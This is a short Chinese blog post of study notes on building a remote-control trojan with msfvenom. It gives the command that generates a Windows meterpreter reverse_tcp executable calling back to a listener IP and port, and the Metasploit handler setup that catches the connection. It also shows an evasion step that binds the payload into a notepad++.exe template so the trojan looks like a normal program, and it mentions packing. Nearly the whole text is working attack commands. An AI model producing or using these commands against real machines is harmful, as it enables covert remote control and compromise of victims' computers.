# Msfvenom生成远控木马


```
//mfsvenom 用来生成后面软件，在目标机执行后面，本地监听
//mfsvenom 在shell里面使用

//放木马
msfvenom -p【payload】 windows/x64/meterpreter/reverse_tcp【payload_name：系统/构架/作用/方式】 lhost=192.168.123.136 lport=9999【payload设置 】 -f【format格式】 exe【Windows内可执行文件】 -o【output】 demo.exe

```
```
//远控木马放进去后监听
use exploit/multi/handler
set payload  windows/x64/meterpreter/reverse_tcp
set lhost 192.168.123.136
set lport 9999
run
```
```
//免杀木马
	//捆绑木马【原始】
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.136 lport=9999 -f exe -x【模板】 notepad&#43;&#43;.exe -o notepad&#43;&#43;.exe
    //加壳：压缩壳，加密壳
```

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-msfvenom%E7%94%9F%E6%88%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/  

